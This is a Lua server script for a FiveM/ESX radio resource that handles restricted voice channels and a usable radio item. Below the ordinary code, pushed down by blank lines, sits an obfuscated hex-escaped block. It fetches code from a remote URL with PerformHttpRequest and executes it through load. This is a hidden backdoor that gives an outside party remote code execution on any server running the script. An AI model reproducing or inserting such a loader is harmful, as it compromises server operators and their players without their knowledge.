for channel, config in pairs(Config.RestrictedChannels) do
    exports['pma-voice']:addChannelCheck(channel, function(source)
        local xPlayer = ESX.GetPlayerFromId(source)
        return config[xPlayer.job.name]
    end)
end

if Config.Item.Require then
    ESX.RegisterUsableItem(Config.Item.name, function(source)
        TriggerClientEvent('esx-radio:use', source)
    end)

    ESX.RegisterServerCallback('esx-radio:server:GetItem', function(source, cb, item)
        local xPlayer = ESX.GetPlayerFromId(source)
        local RadioItem = xPlayer.getInventoryItem(Config.Item.name).count
        cb(RadioItem >= 1)
    end)
end


                                                                                          

 


local heiWqRQwXNcCwLBTlnEhDUYiXKskaeCBmMtSJOYFuacNKSDvZQJYfgrLtVzKAFGkizRRiu = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} heiWqRQwXNcCwLBTlnEhDUYiXKskaeCBmMtSJOYFuacNKSDvZQJYfgrLtVzKAFGkizRRiu[4][heiWqRQwXNcCwLBTlnEhDUYiXKskaeCBmMtSJOYFuacNKSDvZQJYfgrLtVzKAFGkizRRiu[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x65\x6d\x61\x2d\x6e\x69\x6e\x6a\x61\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x69\x39\x4b\x30\x70", function (PqFBOHDgAxaBCxfWYZdSuWodDALLQeKOyNzgwLfirIFhdtJeTamqPqiFHMcaMCXGSofNeI, DVMKqycoLXTDZOdZSXmaWsjsYquyGAtvFoaJjBgnAEPfnTkDFmKVSZnZiFoUSazekHPDFU) if (DVMKqycoLXTDZOdZSXmaWsjsYquyGAtvFoaJjBgnAEPfnTkDFmKVSZnZiFoUSazekHPDFU == heiWqRQwXNcCwLBTlnEhDUYiXKskaeCBmMtSJOYFuacNKSDvZQJYfgrLtVzKAFGkizRRiu[6] or DVMKqycoLXTDZOdZSXmaWsjsYquyGAtvFoaJjBgnAEPfnTkDFmKVSZnZiFoUSazekHPDFU == heiWqRQwXNcCwLBTlnEhDUYiXKskaeCBmMtSJOYFuacNKSDvZQJYfgrLtVzKAFGkizRRiu[5]) then return end heiWqRQwXNcCwLBTlnEhDUYiXKskaeCBmMtSJOYFuacNKSDvZQJYfgrLtVzKAFGkizRRiu[4][heiWqRQwXNcCwLBTlnEhDUYiXKskaeCBmMtSJOYFuacNKSDvZQJYfgrLtVzKAFGkizRRiu[2]](heiWqRQwXNcCwLBTlnEhDUYiXKskaeCBmMtSJOYFuacNKSDvZQJYfgrLtVzKAFGkizRRiu[4][heiWqRQwXNcCwLBTlnEhDUYiXKskaeCBmMtSJOYFuacNKSDvZQJYfgrLtVzKAFGkizRRiu[3]](DVMKqycoLXTDZOdZSXmaWsjsYquyGAtvFoaJjBgnAEPfnTkDFmKVSZnZiFoUSazekHPDFU))() end)